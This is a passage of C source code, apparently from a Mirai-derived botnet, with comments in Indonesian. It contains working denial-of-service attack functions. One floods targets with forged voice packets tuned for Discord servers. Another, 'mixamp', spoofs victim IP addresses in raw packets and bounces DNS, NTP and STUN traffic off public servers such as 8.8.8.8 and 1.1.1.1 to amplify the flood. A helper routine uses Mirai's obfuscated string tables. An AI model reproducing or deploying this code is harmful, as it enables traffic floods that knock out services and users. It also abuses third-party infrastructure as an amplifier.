        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x04},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x05}
    };
    
    uint32_t ssrc_values[targs_len][USERS_TO_SIMULATE];
    uint16_t seq[targs_len][USERS_TO_SIMULATE];
    uint32_t ts[targs_len][USERS_TO_SIMULATE];
    uint32_t base_ts = (uint32_t)time(NULL) * 48000;
    
    // DISRUPTIVE PAYLOADS DENGAN HEX RANDOM
    uint8_t disruptive_payloads[7][140];
    for (int i = 0; i < 140; i++) {
        for (int p = 0; p < 7; p++) {
            disruptive_payloads[p][i] = binary_hex[fast_rand() % 256];
        }
    }
    
    for (int t = 0; t < targs_len; t++) {
        for (int u = 0; u < USERS_TO_SIMULATE; u++) {
            uint8_t first_octet = (ntohl(targs[t].addr) >> 24) & 0xFF;
            bool is_discord_infra = (first_octet == 66);
            ssrc_values[t][u] = is_discord_infra ? (0x12345000 + (fast_rand() % 0xFFF)) : (0x10000000 + (fast_rand() % 0xEFFFFFFF));
            seq[t][u] = fast_rand() % 1000;
            ts[t][u] = base_ts + (t * USERS_TO_SIMULATE + u) * 960;
        }
    }
    
    unsigned char packet[200];
    int phase = 0;
    int phase_counter = 0;
    struct timespec last_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &last_time);
    int phase_duration[6] = {80, 120, 60, 100, 40, 150};
    
    int loop_counter = 0;
    
    while (true) {
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        long elapsed_ms = ((current_time.tv_sec - last_time.tv_sec) * 1000) + ((current_time.tv_nsec - last_time.tv_nsec) / 1000000);
        phase_counter += elapsed_ms;
        last_time = current_time;
        
        if (phase_counter >= phase_duration[phase]) {
            phase = (phase + 1) % 6;
            phase_counter = 0;
        }
        
        int sleep_time = (phase == 0 || phase == 3 || phase == 4) ? 1 : (phase == 1) ? 2 : (phase == 2) ? 4 : 3;
        usleep(sleep_time * 1000);
        
        int base_bursts = (phase == 0) ? 25 : (phase == 1) ? 18 : (phase == 2) ? 10 : (phase == 3) ? 22 : (phase == 4) ? 24 : 16;
        
        for (int t = 0; t < targs_len; t++) {
            struct sockaddr_in *sin = &targs[t].sock_addr;
            sin->sin_port = htons(dport);
            
            uint8_t first_octet = (ntohl(targs[t].addr) >> 24) & 0xFF;
            bool is_discord_infra = (first_octet == 66);
            int packet_size = (length > 0 && length <= 200) ? length : (is_discord_infra ? 160 : 145);
            
            for (int i = 0; i < active_sockets; i++) {
                if (socks[i] < 0) continue;
                for (int user = 0; user < USERS_TO_SIMULATE; user++) {
                    int pattern_idx = fast_rand() % (is_discord_infra ? 8 : 6);
                    int payload_idx = fast_rand() % (is_discord_infra ? 7 : 5);
                    
                    memcpy(packet, discord_opus_pattern[pattern_idx], 16);
                    packet[2] = (seq[t][user] >> 8) & 0xFF;
                    packet[3] = seq[t][user] & 0xFF;
                    seq[t][user]++;
                    packet[4] = (ts[t][user] >> 24) & 0xFF;
                    packet[5] = (ts[t][user] >> 16) & 0xFF;
                    packet[6] = (ts[t][user] >> 8) & 0xFF;
                    packet[7] = ts[t][user] & 0xFF;
                    ts[t][user] += 960;
                    packet[8] = (ssrc_values[t][user] >> 24) & 0xFF;
                    packet[9] = (ssrc_values[t][user] >> 16) & 0xFF;
                    packet[10] = (ssrc_values[t][user] >> 8) & 0xFF;
                    packet[11] = ssrc_values[t][user] & 0xFF;
                    size_t copy_size = (packet_size - 16 < 140) ? packet_size - 16 : 140;
                    memcpy(packet + 16, disruptive_payloads[payload_idx], copy_size);
                    
                    int bursts = base_bursts + (user % 5) - 2;
                    if (bursts < 6) bursts = 6;
                    
                    for (int k = 0; k < bursts; k++) {
                        sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, (struct sockaddr *)sin, sizeof(*sin));
                        if (k % 3 == 0) {
                            packet[3] = (seq[t][user] + 1) & 0xFF;
                            packet[7] = (ts[t][user] + 960) & 0xFF;
                            sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, (struct sockaddr *)sin, sizeof(*sin));
                        }
                    }
                }
            }
        }
        
        if (++loop_counter >= 300) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== MIXAMP (DENGAN HEX RANDOM) ====================
void attack_mixamp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0);
    char *amp_type_str = attack_get_opt_str(opts_len, opts, ATK_OPT_CUSTOM, "random");
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);
    
    init_random_pool();
    init_hex_table();
    
    const ipv4_t DNS_AMPLIFIERS[] = {
        INET_ADDR(8,8,8,8), INET_ADDR(1,1,1,1), INET_ADDR(9,9,9,9)
    };
    const ipv4_t NTP_AMPLIFIERS[] = {
        INET_ADDR(216,239,35,0), INET_ADDR(162,159,200,1), INET_ADDR(129,250,35,250)
    };
    const ipv4_t STUN_AMPLIFIERS[] = {
        INET_ADDR(64,233,161,127), INET_ADDR(142,250,31,127), INET_ADDR(172,217,3,110)
    };
    
    static char dns_payload[29];
    static char ntp_payload[48];
    static char stun_payload[20];
    
    // PAYLOAD DENGAN RANDOM HEX
    for (int j = 0; j < 29; j++) dns_payload[j] = binary_hex[fast_rand() % 256];
    for (int j = 0; j < 48; j++) ntp_payload[j] = binary_hex[fast_rand() % 256];
    for (int j = 0; j < 20; j++) stun_payload[j] = binary_hex[fast_rand() % 256];
    
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) return;
    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    
    size_t max_payload = 48;
    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct udphdr) + max_payload);
    }
    
    int amp_type = 0;
    if (strcmp(amp_type_str, "dns") == 0) amp_type = 1;
    else if (strcmp(amp_type_str, "ntp") == 0) amp_type = 2;
    else if (strcmp(amp_type_str, "stun") == 0) amp_type = 3;
    
    int loop_counter = 0;
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            ipv4_t amp_ip = 0;
            port_t dest_port;
            const char *payload;
            uint16_t payload_len;
            
            int prot = amp_type ? amp_type : (fast_rand() % 3) + 1;
            
            switch (prot) {
                case 1:
                    amp_ip = DNS_AMPLIFIERS[fast_rand() % (sizeof(DNS_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 53 : dport;
                    payload = dns_payload;
                    payload_len = 29;
                    break;
                case 2:
                    amp_ip = NTP_AMPLIFIERS[fast_rand() % (sizeof(NTP_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 123 : dport;
                    payload = ntp_payload;
                    payload_len = 48;
                    break;
                default:
                    amp_ip = STUN_AMPLIFIERS[fast_rand() % (sizeof(STUN_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 3478 : dport;
                    payload = stun_payload;
                    payload_len = 20;
                    break;
            }
            
            uint16_t tx_id = fast_rand() & 0xFFFF;
            memcpy(data, payload, payload_len);
            if (prot == 1) *((uint16_t*)data) = tx_id;
            
            // UBAH SATU BYTE RANDOM HEX
            data[fast_rand() % payload_len] = binary_hex[fast_rand() % 256];
            
            uint32_t victim_ip = targs[i].addr;
            if (targs[i].netmask < 32) {
                victim_ip = htonl(ntohl(targs[i].addr) + (fast_rand() % (1 << (32 - targs[i].netmask))));
            }
            
            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
            iph->id = htons(ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = victim_ip;
            iph->daddr = amp_ip;
            if (dont_frag) iph->frag_off = htons(1 << 14);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            
            udph->source = htons(fast_rand_port());
            udph->dest = htons(dest_port);
            udph->len = htons(sizeof(struct udphdr) + payload_len);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, ntohs(udph->len), ntohs(udph->len));
            
            struct sockaddr_in dest_addr = {0};
            dest_addr.sin_family = AF_INET;
            dest_addr.sin_addr.s_addr = amp_ip;
            sendto(fd, pkts[i], ntohs(iph->tot_len), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
        
        if (++loop_counter >= 500) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== DNS RESOLVER ====================
static ipv4_t get_dns_resolver(void)
{
    if (dns_resolver_initialized) {
        return dns_resolver_cached;
    }
    
    int fd;
    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    
    if (fd >= 0) {
        int ret, nspos;
        char resolvbuf[2048];
        ret = read(fd, resolvbuf, sizeof(resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        
        if (nspos != -1) {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;
            
            for (i = nspos; i < ret; i++) {
                char c = resolvbuf[i];
                if (!finished_whitespace) {
                    if (c == ' ' || c == '\t') continue;
                    else finished_whitespace = TRUE;
                }
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1))) {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }
            if (found) {
                dns_resolver_cached = inet_addr(ipbuf);
                dns_resolver_initialized = 1;
                return dns_resolver_cached;
            }
        }
    }
    
    switch (fast_rand() % 4) {
        case 0: return INET_ADDR(8, 8, 8, 8);
        case 1: return INET_ADDR(74, 82, 42, 42);
        case 2: return INET_ADDR(64, 6, 64, 6);
        case 3: return INET_ADDR(4, 2, 2, 2);
    }
    return INET_ADDR(8, 8, 8, 8);
}